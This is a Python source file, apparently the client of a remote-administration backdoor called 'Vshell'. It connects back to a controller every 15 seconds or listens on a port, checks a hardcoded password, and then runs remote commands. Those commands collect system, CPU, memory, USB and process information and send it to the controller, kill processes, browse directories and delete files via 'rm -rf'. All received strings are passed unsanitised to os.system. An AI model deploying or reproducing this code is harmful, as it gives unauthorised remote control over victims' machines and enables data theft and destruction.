#!/usr/bin/env python3
# -*- coding: utf-8 -*-
 
# 导入socket库:
import socket
import time
import os

# 变量定义 ACTIVE 是否主动连接控制端 / TEMP 临时文件路径 / SYS 被控端系统类型 / PATH 被控端文件管理当前路径
ACTIVE = 1
IP = '127.0.0.1'
PORT = 9481
PASS = 'AC131'
TEMP = None
SYS =  None
PATH = None

#文字颜色
# 红色 \033[0;31;48m[!]\033[0m
# 绿色 \033[0;32;48m[+]\033[0m
# 黄色 \033[0;33;48m[-]\033[0m

# 主动连接控制端
def Active():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        if s.connect_ex((IP, PORT)) != 0:
            s.close()
            time.sleep(15)
        elif PassCheck(s):
            return s
        else:
            s.close()
            time.sleep(15)

# 等待控制端连接
def Passive():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0',PORT))
    s.listen(1)
    while True:
        sock, addr = s.accept()
        if PassCheck(sock):
            return sock
            
# 验证
def PassCheck(sock):
    while True:
        cmd = sock.recv(1024)
        if cmd.decode('utf-8') == 'Vshell P%s' %PASS:
            sock.send(b'HiAdmin')
            return True
        else:
            sock.send(b'NoAccess')
            return False

# 发送数据（发送时候分数据主体和结束符End，中间睡0.1是为了分包,主控端需要单独的一个包判断发送结束，我也不知道为啥不睡就会导致两句代码发送一个包，明明之前就ok，心态炸了）
def Send(data,sock):
    data = data.encode('utf-8')
    sock.send(data)
    time.sleep(0.1)
    sock.send(b'End')

# 获取系统信息
def Getinfo(sock):
    if SYS == 'nt':
        os.system('echo nt@ > C:\\ProgramData\\info.txt')
        os.system('systeminfo >> C:\\ProgramData\\info.txt')
        f = open('C:\\ProgramData\\info.txt','r')
        data = f.read()
        f.close()
        Send(data,sock)
        os.system('del /f /q C:\\ProgramData\\info.txt')
        return
    else:
        os.system('echo posix@ > %s/info.txt' % TEMP)
        os.system('uname -a >> %s/info.txt' % TEMP)
        f = open('%s/info.txt' % TEMP,'r')
        data = f.read()
        f.close()
        Send(data,sock)
        os.system('rm -f %s/info.txt' % TEMP)
        return

# 获取更多信息
def GetMoreinfo(sock,target):
    if target == 'CPU':
        os.system('cat /proc/cpuinfo >> %s/info.txt' % TEMP)
    elif target == 'MEM':
        os.system('cat /proc/meminfo >> %s/info.txt' % TEMP)
    elif target == 'USB':
        os.system('lsusb -tv >> %s/info.txt' % TEMP)
    f = open('%s/info.txt' % TEMP,'r')
    data = f.read()
    f.close()
    Send(data,sock)
    os.system('rm -f %s/info.txt' % TEMP)

# 进程信息
def Process(sock):
    if SYS == 'nt':
        os.system('tasklist >> C:\\ProgramData\\info.txt')
        f = open('C:\\ProgramData\\info.txt','r')
        data = f.read()
        f.close()
        Send(data,sock)
        os.system('del /f /q C:\\ProgramData\\info.txt')
        return
    else:
        os.system('ps -aux >> info.txt')
        f = open('info.txt','r')
        data = f.read()
        f.close()
        Send(data,sock)
        os.system('rm -f info.txt')
        return

# Kill进程 by Name
def KillName(sock):
    d = sock.recv(1024)
    name = d.decode('utf-8')
    if SYS == 'nt':
        os.system('taskkill /f /im %s' %name)
        sock.send(b'The command has been executed.')
    else:
        sock.send(b'This is Linux OS. Can\'t execute the command.')
    return

# Kill进程 by ID
def KillId(sock):
    d = sock.recv(1024)
    id = d.decode('utf-8')
    if SYS == 'nt':
        os.system('taskkill /f /pid %s' %id)
    else:
        os.system('kill -9 %s' %id)
    sock.send(b'The command has been executed.')
    return
    
# 文件列表
def File(sock):
    global PATH
    if SYS == 'nt':
        os.system('echo %s@V@ >> C:\\ProgramData\\info.txt' % PATH)
        os.system('dir %s >> C:\\ProgramData\\info.txt' % PATH)
        f = open('C:\\ProgramData\\info.txt','r')
        data = f.read()
        f.close()
        Send(data,sock)
        os.system('del /f /q C:\\ProgramData\\info.txt')
        return
    else:
        os.system('echo %s@V@ >> %s/info.txt' % (PATH, TEMP))
        os.system('ls -l %s >> %s/info.txt' % (PATH, TEMP))
        f = open('%s/info.txt' % TEMP,'r')
        data = f.read()
        f.close()
        Send(data,sock)
        os.system('rm -f %s/info.txt' % TEMP)
        return

# 父目录
def UpDic(sock):
    global PATH
    try:
        os.chdir('..')
    except:
        pass
    PATH = os.getcwd()
    return

# 子目录
def DownDic(sock):
    global PATH
    d = sock.recv(1024)
    name = d.decode('utf-8')
    try:
        os.chdir('%s' % name)
    except:
        pass
    PATH = os.getcwd()
    return

# 删除文件
def Del(sock):
    d = sock.recv(1024)
    name = d.decode('utf-8')
    os.system('rm -rf %s' % name)
    return

# 主程序
if ACTIVE == 0:
    s = Passive()
else:
    s = Active()
#系统判断的核心，只能判断win/linux，并且判断不出MacOS，后面命令都是按Linux写的，所以不支持Macos
SYS = os.name
#获取当前工作路径
PATH = os.getcwd()
TEMP = os.getcwd()
#循环接受命令，一级指令为数字，二级为*（一级）x*（二级）
while True:
    d = s.recv(1024)
    print('%s' % d)
    if d == b'0':
        s.send(b'Bye')
        break
    elif d == b'1':
        Getinfo(s)
    elif d == b'1x01':
        GetMoreinfo(s,'CPU')
    elif d == b'1x02':
        GetMoreinfo(s,'MEM')
    elif d == b'1x03':
        GetMoreinfo(s,'USB')
    elif d == b'2':
        Process(s)
    elif d == b'2x01':
        KillName(s)
    elif d == b'2x02':
        KillId(s)
    elif d == b'3':
        File(s)
    elif d == b'3x01':
        UpDic(s)
    elif d == b'3x02':
        DownDic(s)
    elif d == b'3x03':
        Del(s)
s.close()